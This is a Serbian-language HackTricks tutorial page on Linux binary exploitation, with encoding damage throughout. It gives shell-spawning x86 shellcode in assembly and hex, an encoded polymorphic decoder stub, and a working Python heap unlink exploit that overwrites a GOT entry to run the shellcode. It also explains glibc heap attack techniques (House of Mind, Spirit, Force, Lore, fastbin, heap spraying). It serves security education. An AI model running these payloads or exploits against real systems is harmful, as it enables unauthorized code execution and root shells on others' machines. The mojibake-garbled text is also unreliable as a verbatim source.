# Linux Exploiting (Osnovno)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **2.SHELLCODE**

Vidi prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; Äistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleÄ‘ivanje\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; IzvrÅ¡iti syscall

**nasm -f elf assembly.asm** â€”> VraÄ‡a nam .o datoteku\
**ld assembly.o -o shellcodeout** â€”> Daje nam izvrÅ¡nu datoteku formiranu od asemblerskog koda i moÅ¾emo izvuÄ‡i opkodove sa **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Da bismo videli da je zaista naÅ¡ shellcode i izvukli OpKodove

**Proverite da li shellcode funkcioniÅ¡e**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Da biste videli da li se sistemski pozivi pravilno izvrÅ¡avaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-a moÅ¾ete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodatno stavlja EIP na stek. Nakon instrukcije poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om moÅ¾emo pokazati na string i nastaviti izvrÅ¡avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Eksplatacija koriÅ¡Ä‡enjem Staka(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (traÅ¾i neki potpis postavljen u shellcode-u). Korisno u sluÄajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su Å¡ifrovani shellkodovi koji imaju male kodove koji ih deÅ¡ifruju i skoÄe na njih, koristeÄ‡i trik Call-Pop, ovde je **primer Cezarove Å¡ifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Dodatne metode**













###





## **8 Preplavljenje hipa: Osnovni eksploiti**

**Dodeljeni fragment**

prev\_size |\
size | â€”Zaglavlje\
\*mem | Podaci

**Slobodan fragment**

prev\_size |\
size |\
\*fd | Ptr naprednog fragmenta\
\*bk | Ptr nazadnog fragmenta â€”Zaglavlje\
\*mem | Podaci

Slobodni fragmenti su u dvostruko povezanoj listi (bin) i nikada ne mogu biti dva slobodna fragmenta zajedno (spajaju se)

U "size" postoje bitovi koji pokazuju: Da li je prethodni fragment u upotrebi, da li je fragment dodeljen putem mmap() i da li fragment pripada primarnoj areni.

Kada se oslobodi fragment, ako su neki od susednih slobodni, oni se spajaju pomoÄ‡u makroa unlink() i novi, veÄ‡i fragment se prosleÄ‘uje frontlink() da ga ubaci u odgovarajuÄ‡i bin.

unlink(){\
BK = P->bk; â€”> BK novog fragmenta je onaj koji je imao prethodno slobodan fragment\
FD = P->fd; â€”> FD novog fragmenta je onaj koji je imao prethodno slobodan fragment\
FD->bk = BK; â€”> BK sledeÄ‡eg fragmenta pokazuje na novi fragment\
BK->fd = FD; â€”> FD prethodnog fragmenta pokazuje na novi fragment\
}

Dakle, ako uspemo da promenimo P->bk sa adresom shell koda i P->fd sa adresom unosa u GOT ili DTORS manje 12, postiÅ¾e se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Na taj naÄin, shell kod se izvrÅ¡ava prilikom izlaska iz programa.

TakoÄ‘e, 4. izjava unlink() piÅ¡e neÅ¡to i shell kod mora biti prilagoÄ‘en za ovo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Ovo uzrokuje pisanje 4 bajta od 8. bajta shell koda, pa prva instrukcija shell koda mora biti skok kako bi preskoÄila ovo i preÅ¡la na nops koji vode do ostatka shell koda.

Stoga se eksploit kreira:

U buffer1 ubacujemo shell kod poÄevÅ¡i od skoka kako bi preÅ¡ao na nops ili ostatak shell koda.

Nakon shell koda ubacujemo punjenje dok ne doÄ‘emo do polja prev\_size i size sledeÄ‡eg fragmenta. Na tim mestima ubacujemo 0xfffffff0 (tako da se prev\_size prepisuje da ima bit koji kaÅ¾e da je slobodan) i "-4" (0xfffffffc) u size (da bi kada proveri u 3. fragmentu da li je 2. bio slobodan, zapravo otiÅ¡ao na modifikovani prev\_size koji Ä‡e reÄ‡i da je slobodan) -> Tako kada free() istraÅ¾uje, otiÄ‡i Ä‡e na size 3. ali zapravo Ä‡e otiÄ‡i na 2. - 4 i pomisliÄ‡e da je 2. fragment slobodan. I tada Ä‡e pozvati **unlink()**.

Pozivom unlink() koristi se kao P->fd prvi podaci 2. fragmenta, pa Ä‡e se tamo ubaciti adresa koju Å¾elite prepisati - 12 (jer Ä‡e u FD->bk dodati 12 adresi saÄuvanoj u FD). I na toj adresi unosi se druga adresa koja se nalazi u 2. fragmentu, koja Ä‡e biti adresa shell koda (laÅ¾ni P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Bit koji oznaÄava da je prethodni fragment slobodan treba biti 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, da program misli da je "size" 3. fragmenta 4 bajta unazad (pokazuje na prev\_size) jer tu gleda da li je 2. fragment slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poÄetku payloada dodajemo 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biÄ‡e adresa koja Ä‡e biti prepisana da bi se shell kod pokrenuo drugi put kada se pozove free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Kao Å¡to je reÄeno, payload poÄinje sa 8 bajtova punjenja jer da**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifikuje se 2. fragment, got\_free pokazuje gde Ä‡emo saÄuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaÄ‘ajuÄ‡i u obrnutom redosledu (wargame)**

KontroliÅ¡emo 3 uzastopna fragmenta i oslobaÄ‘amo ih u obrnutom redosledu od rezervisanog.

U tom sluÄaju:

U fragment c se stavlja shell kod

Fragment a koristimo da prepisujemo b tako da size ima deaktiviran bit PREV\_INUSE tako da misli da je fragment a slobodan.

TakoÄ‘e, u zaglavlju b se prepisuje size da bude -4.

Tada Ä‡e program misliti da je "a" slobodan i u binu, pa Ä‡e pozvati unlink() da ga odvoji. MeÄ‘utim, poÅ¡to je zaglavlje PREV\_SIZE -4, misliÄ‡e da fragment "a" zapravo poÄinje na b+4. Drugim reÄima, pozvaÄ‡e unlink() na fragment koji poÄinje na b+4, pa Ä‡e na b+12 biti pokazivaÄ "fd" i na b+16 Ä‡e biti pokazivaÄ "bk".

Na taj naÄin, ako stavimo adresu shell koda u bk i adresu funkcije "puts()" -12 u fd, dobijamo naÅ¡ payload.

**Tehnika Frontlink**

Poziva se frontlink kada se neÅ¡to oslobodi i nijedan od susednih fragmenta nije slobodan, ne poziva se unlink() veÄ‡ se direktno poziva frontlink().

Korisna ranjivost kada se napadnuti malloc nikada ne oslobaÄ‘a (free()).

Potrebno je:

Buffer koji moÅ¾e biti preplavljen funkcijom za unos podataka

Buffer koji je susedan ovom koji treba biti osloboÄ‘en i Äije Ä‡e se polje fd u zaglavlju promeniti zbog preplavljivanja prethodnog bafera

Buffer koji treba osloboditi sa veliÄinom veÄ‡om od 512 ali manjom od prethodnog bafera

Buffer deklarisan pre koraka 3 koji omoguÄ‡ava prepisivanje prev\_size ovog

Na ovaj naÄin, postiÅ¾uÄ‡i preplavljivanje u dva malloca na nekontrolisan naÄin i u jednom kontrolisanom ali koji se oslobaÄ‘a samo jednom, moÅ¾emo napraviti eksploit.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaÄem, dva bina pokazuju na istu adresu.

U sluÄaju da se Å¾eli ponovo koristiti jedan, to se moÅ¾e uraditi bez problema. U sluÄaju da se Å¾eli koristiti drugi, dobiÄ‡e isti prostor, pa Ä‡emo imati laÅ¾irane pokazivaÄe "fd" i "bk" sa podacima koje Ä‡e upisati prethodna rezervacija.

**Nakon free()**

Prethodno osloboÄ‘eni pokazivaÄ se ponovo koristi bez kontrole.
## **8 Preplavljenje hipa: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Samo jedan poziv free() je potreban da bi se izazvalo izvrÅ¡avanje proizvoljnog koda. Cilj je pronaÄ‡i drugi komad koji moÅ¾e biti preplavljen prethodnim i osloboÄ‘en.

Poziv free() dovodi do poziva public\_fREe(mem), koji radi:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> VraÄ‡a pokazivaÄ na adresu na kojoj poÄinje komad (mem-8)

â€¦

ar\_ptr = arena\_for_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

U \[1] se proverava polje size bit NON\_MAIN\_ARENA, koje se moÅ¾e promeniti da bi provera vratila taÄno i izvrÅ¡ila heap\_for\_ptr() koja vrÅ¡i and na "mem" ostavljajuÄ‡i 2,5 najmanje bita na 0 (u naÅ¡em sluÄaju od 0x0804a000 postaje 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naÄin, ako moÅ¾emo kontrolisati komad na primer na 0x0804a000 i komad Ä‡e biti osloboÄ‘en na **0x081002a0** moÅ¾emo stiÄ‡i do adrese 0x08100000 i pisati Å¡ta god Å¾elimo, na primer **0x0804a000**. Kada se ovaj drugi komad oslobodi, heap\_for\_ptr(ptr)->ar\_ptr Ä‡e vratiti ono Å¡to smo napisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlaÄi vrednost prvih 4 bajta, ar\_ptr)

Na ovaj naÄin se poziva \_int\_free(ar\_ptr, mem), odnosno, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao Å¡to smo videli ranije, moÅ¾emo kontrolisati vrednost av, jer je to ono Å¡to piÅ¡emo u komadu koji Ä‡e biti osloboÄ‘en.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Stoga, ako u av->bins\[2] napiÅ¡emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji Ä‡e se upisati u \_\_DTOR\_END\_\_ adresa drugog komada.

Drugim reÄima, u prvom komadu moramo staviti na poÄetak mnogo puta adresu \_\_DTOR\_END\_\_-12 jer Ä‡e av->bins\[2] to izvuÄ‡i

Na adresi na koju padne adresa drugog komada sa poslednjih 5 nula moramo napisati adresu ovog prvog komada kako bi heap\_for\_ptr() mislio da je ar\_ptr na poÄetku prvog komada i izvukao av->bins\[2] odande

U drugom komadu i zahvaljujuÄ‡i prvom, prepisujemo prev\_size sa skokom 0x0c i size sa neÄim Å¡to Ä‡e aktivirati -> NON\_MAIN\_ARENA

Zatim u komadu 2 stavljamo puno nops i na kraju shellcode

Na ovaj naÄin Ä‡e se pozvati \_int\_free(KOMAD1, KOMAD2) i pratiti instrukcije za pisanje u \_\_DTOR\_END\_\_ adresu prev\_size KOMAD2 koji Ä‡e skoÄiti na shellcode.

Za primenu ove tehnike potrebno je da se ispune neki dodatni zahtevi koji malo komplikuju payload.

Ova tehnika viÅ¡e nije primenjiva jer je primenjen gotovo isti zakrpa kao i za unlink. UporeÄ‘uju se da li novi sajt na koji se pokazuje takoÄ‘e pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvrÅ¡avanje sledeÄ‡eg koda do kojeg se dolazi nakon prve provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gde je fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Na ovaj naÄin, ako se postavi u "fb" adresa funkcije u GOT, na ovoj adresi Ä‡e se postaviti adresa prepisanog komada. Za ovo Ä‡e biti potrebno da je arena blizu adresa dtors. TaÄnije, av->max\_fast mora biti na adresi koju Ä‡emo prepisati.

S obzirom da smo sa The House of Mind videli da mi kontroliÅ¡emo poziciju av.

Zato ako u polje size stavimo veliÄinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() Ä‡e vratiti fastbins\[-1], koji Ä‡e pokazivati na av->max\_fast

U ovom sluÄaju av->max\_fast Ä‡e biti adresa koja Ä‡e biti prepisana (ne na koju pokazuje, veÄ‡ ta pozicija Ä‡e biti prepisana).

TakoÄ‘e, mora se ispuniti uslov da komad koji je susedan osloboÄ‘enom komadu mora biti veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog komada 8, u ovom laÅ¾nom komadu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom komadu, treba staviti na poÄetak skok koji Ä‡e pasti na nops).

TakoÄ‘e, taj isti laÅ¾ni komad mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula iz \_DTOR\_END\_ i malog broja adresa u GOT, nijedna adresa iz ovih sekcija nije pogodna za prepisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

JoÅ¡ jedan naÄin napada je preusmeravanje **av** ka steku.

Ako promenimo veliÄinu da bude 16 umesto 8, tada: fastbin\_index() Ä‡e vratiti fastbins\[0] i moÅ¾emo iskoristiti ovo da prepisujemo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili Äudnih vrednosti na steku, zapravo moramo biti u ovom stanju: 4 bajta nula + EBP + RET

4 bajta nula su potrebna da Ä‡e **av** biti na ovoj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** Ä‡e biti EBP i biÄ‡e vrednost koja Ä‡e nam omoguÄ‡iti da preskoÄimo ograniÄenja.

U **av->fastbins\[0]** Ä‡e se prepisati adresa **p** i biÄ‡e RET, tako Ä‡e se skoÄiti na shellcode.

TakoÄ‘e, u **av->system\_mem** (1484 bajta iznad pozicije na steku) Ä‡e biti dosta smeÄ‡a koje Ä‡e nam omoguÄ‡iti da preskoÄimo proveru koja se vrÅ¡i.

TakoÄ‘e, mora se ispuniti uslov da komad koji je susedan osloboÄ‘enom komadu mora biti veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog komada 16, u ovom laÅ¾nom komadu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom komadu, treba staviti na poÄetak skok koji Ä‡e pasti na nops koji dolaze posle polja size novog laÅ¾nog komada).

**The House of Spirit**

U ovom sluÄaju traÅ¾imo da imamo pokazivaÄ na malloc koji moÅ¾e biti promenjen od strane napadaÄa (na primer, da je pokazivaÄ na steku ispod moguÄ‡eg prelivanja promenljive).

Na taj naÄin, mogli bismo da nateramo ovaj pokazivaÄ da pokazuje gde god Å¾elimo. MeÄ‘utim, ne svako mesto je validno, veliÄina laÅ¾nog komada mora biti manja od av->max\_fast i taÄnije jednaka veliÄini koja Ä‡e biti traÅ¾ena u buduÄ‡em pozivu malloc()+8. Zbog toga, ako znamo da Ä‡e nakon ovog ranjivog pokazivaÄa biti pozvan malloc(40), veliÄina laÅ¾nog komada mora biti jednaka 48.
Ako na primer program pita korisnika za broj, moÅ¾emo uneti 48 i usmeriti promenljivi pokazivaÄ malloc-a na sledeÄ‡ih 4 bajta (koji bi mogli pripadati EBP-u sreÄ‡om, tako da 48 ostaje iza, kao da je veliÄina zaglavlja). TakoÄ‘e, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluÄaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

Ako se ovo ostvari, kada se pozove sledeÄ‡i malloc koji smo rekli da je malloc(40), biÄ‡e dodeljena adresa EBP-u. Ako napadaÄ takoÄ‘e moÅ¾e kontrolisati Å¡ta se piÅ¡e u ovom malloc-u, moÅ¾e prebrisati kako EBP tako i EIP sa Å¾eljenom adresom.

Ovo je zato Å¡to kada se oslobodi free(), ÄuvaÄ‡e se da u adresi koja pokazuje na EBP steka postoji deo taÄno veliÄine za novi malloc() koji se Å¾eli rezervisati, pa Ä‡e mu dodeliti tu adresu.

**The House of Force**

Potrebno je:

* PrekoraÄenje u delu koji omoguÄ‡ava prebrisavanje wilderness-a
* Poziv malloc() sa veliÄinom definisanom od strane korisnika
* Poziv malloc() Äiji podaci mogu biti definisani od strane korisnika

Prvo Å¡to se radi je prebrisavanje veliÄine dela wilderness sa veoma velikom vrednoÅ¡Ä‡u (0xffffffff), tako da Ä‡e svaki zahtev za memorijom dovoljno velik biti obraÄ‘en u \_int\_malloc() bez potrebe za proÅ¡irivanjem hipa.

Drugo je promeniti av->top tako da pokazuje na deo memorije pod kontrolom napadaÄa, kao Å¡to je stek. U av->top Ä‡e se staviti \&EIP - 8.

Moramo prebrisati av->top kako bi pokazivao na deo memorije pod kontrolom napadaÄa:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost trenutne adrese wilderness dela (trenutni av->top) i remainder je taÄno ta adresa plus broj bajtova traÅ¾enih od strane malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadrÅ¾i 0x080c2788, tada je potrebno rezervisati u kontrolisanom mallocu toliko bajtova da av->top pokazuje na $EIP-8 za sledeÄ‡i malloc():

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naÄin Ä‡e se saÄuvati promenjena vrednost u av->top i sledeÄ‡i malloc Ä‡e pokazivati na EIP i moÄ‡i Ä‡e ga prebrisati.

VaÅ¾no je znati da veliÄina novog dela wilderness bude veÄ‡a od zahteva poslednjeg malloc(). Drugim reÄima, ako wilderness pokazuje na \&EIP-8, veliÄina Ä‡e biti taÄno na EBP polju steka.

**The House of Lore**

**Korupcija SmallBin**

OslobaÄ‘eni delovi se ubacuju u bin u zavisnosti od njihove veliÄine. Ali pre nego Å¡to se ubace, Äuvaju se u unsorted bins. Kada se deo oslobodi, ne stavlja se odmah u svoj bin veÄ‡ ostaje u unsorted bins. Zatim, ako se rezerviÅ¡e novi deo i prethodni oslobaÄ‘eni moÅ¾e posluÅ¾iti, vraÄ‡a se, ali ako se rezerviÅ¡e veÄ‡i deo, oslobaÄ‘eni deo u unsorted bins se stavlja u odgovarajuÄ‡i bin.

Da bi se doÅ¡lo do ranjivog koda, zahtev za memorijom mora biti veÄ‡i od av->max\_fast (obiÄno 72) i manji od MIN\_LARGE\_SIZE (512).

Ako u binu postoji deo odgovarajuÄ‡e veliÄine zahtevanog dela, on se vraÄ‡a nakon Å¡to se odveÅ¾e:

bck = victim->bk; Pokazuje na prethodni deo, jedina informacija koju moÅ¾emo promeniti.

bin->bk = bck; Pretposlednji deo postaje poslednji, ako bck pokazuje na stek, sledeÄ‡em rezervisanom delu Ä‡e se dati ta adresa

bck->fd = bin; Zatvara se lista tako Å¡to pokazuje na bin

Potrebno je:

Rezervisati dva malloc-a, tako da se prvom moÅ¾e prekoraÄiti nakon Å¡to je drugi osloboÄ‘en i ubaÄen u svoj bin (tj. rezervisan je veÄ‡i malloc od drugog dela pre prekoraÄenja)

Malloc rezervisan sa adresom koju bira napadaÄ mora biti pod kontrolom napadaÄa.

Cilj je sledeÄ‡i, ako moÅ¾emo prekoraÄiti hip koji ispod ima veÄ‡ osloboÄ‘en deo u svom binu, moÅ¾emo promeniti njegov pokazivaÄ bk. Ako promenimo njegov pokazivaÄ bk i taj deo postane prvi u listi bina i rezervisan je, bin Ä‡e biti prevaren i reÄ‡i Ä‡e mu da je poslednji deo liste (sledeÄ‡i za ponudom) na laÅ¾noj adresi koju smo postavili (na steku ili GOT na primer). Dakle, ako se rezerviÅ¡e joÅ¡ jedan deo i napadaÄ ima dozvolu na njemu, dobiÄ‡e deo na Å¾eljenoj poziciji i moÄ‡i Ä‡e da piÅ¡e u njega.

Nakon oslobaÄ‘anja promenjenog dela, potrebno je rezervisati deo veÄ‡i od osloboÄ‘enog, tako da promenjeni deo izaÄ‘e iz unsorted bins i ubaci se u svoj bin.

Kada se naÄ‘e u svom binu, vreme je da se promeni pokazivaÄ bk preko prekoraÄenja kako bi pokazivao na Å¾eljenu adresu.

Tako bin mora da saÄeka dovoljno poziva malloc() da se ponovo koristi promenjeni bin i prevari bin tako Å¡to Ä‡e mu reÄ‡i da je sledeÄ‡i deo na laÅ¾noj adresi. Zatim Ä‡e dobiti deo koji nas zanima.

Da bi se iskoristila ranjivost Å¡to je pre moguÄ‡e, idealno bi bilo: Rezervacija ranjivog dela, rezervacija dela koji Ä‡e se promeniti, oslobaÄ‘anje tog dela, rezervacija dela veÄ‡eg od dela koji Ä‡e se promeniti, promena dela (ranjivost), rezervacija dela iste veliÄine kao ranjeno i rezervacija drugog dela iste veliÄine koji Ä‡e pokazivati na odabranu adresu.

Da bi se zaÅ¡titio ovaj napad, koristi se tipiÄna provera da deo "nije" laÅ¾an: proverava se da li bck->fd pokazuje na victim. Drugim reÄima, u naÅ¡em sluÄaju, ako pokazivaÄ fd\* laÅ¾nog dela pokazuje na victim na steku. Da bi se prevaziÅ¡la ova zaÅ¡tita, napadaÄ mora biti sposoban da na neki naÄin (verovatno preko steka) upiÅ¡e u odgovarajuÄ‡u adresu adresu victim. Tako Ä‡e izgledati kao pravi deo.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre i joÅ¡ neki, osim toga, rezervisani delovi moraju biti veÄ‡i od 512.

Napad je sliÄan prethodnom, tj. treba promeniti pokazivaÄ bk i potrebne su sve te pozive malloc(), ali takoÄ‘e treba promeniti veliÄinu promenjenog dela tako da ta veliÄina - nb bude < MINSIZE.

Na primer, postaviÄ‡emo veliÄinu na 1552 tako da 1552 - 1544 = 8 < MINSIZE (oduzimanje ne moÅ¾e biti negativno jer se uporeÄ‘uje sa unsigned)

TakoÄ‘e je uveden zakrpa da bi se to uÄinilo joÅ¡ sloÅ¾enijim.

**Heap Spraying**

Osnovna ideja je rezervisati Å¡to viÅ¡e memorije za hipove i popuniti ih nizom nops-a zavrÅ¡enim shellcode-om. TakoÄ‘e, kao jastuk se koristi 0x0c. PokuÅ¡aÄ‡emo da skoÄimo na adresu 0x0c0c0c0c, pa ako se neka adresa prepiÅ¡e sa ovim jastukom, skoÄiÄ‡e tamo. Osnovna taktika je rezervisati Å¡to je viÅ¡e moguÄ‡e da vidimo da li se neki pokazivaÄ prepiÅ¡e i skoÄiti na 0x0c0c0c0c u nadi da tamo postoje nops.

**Heap Feng Shui**

Sastoji se od rezervacija i oslobaÄ‘anja memorije kako bi se segmentirala memorija tako da izmeÄ‘u slobodnih delova ostanu rezervisani delovi. Bafer za prekoraÄenje Ä‡e se nalaziti u jednom od tih delova.
**objdump -t ./exec | grep varBss** â€”> Tabela simbola, za izvlaÄenje adrese promenljivih i funkcija\
**objdump -TR ./exec | grep exit(func lib)** â€”> Za izvlaÄenje adrese funkcija iz biblioteka (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> IzvlaÄi adresu puts za prepisivanje u GOT\
**objdump -D ./exec** â€”> Disas ALL do ulaza plt\
**objdump -p -/exec**\
**Info functions strncmp â€”>** Info o funkciji u gdb

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)
* [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
* [https://pwnable.tw/](https://pwnable.tw/)
* [https://ctf.hackucf.org/](https://ctf.hackucf.org/)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
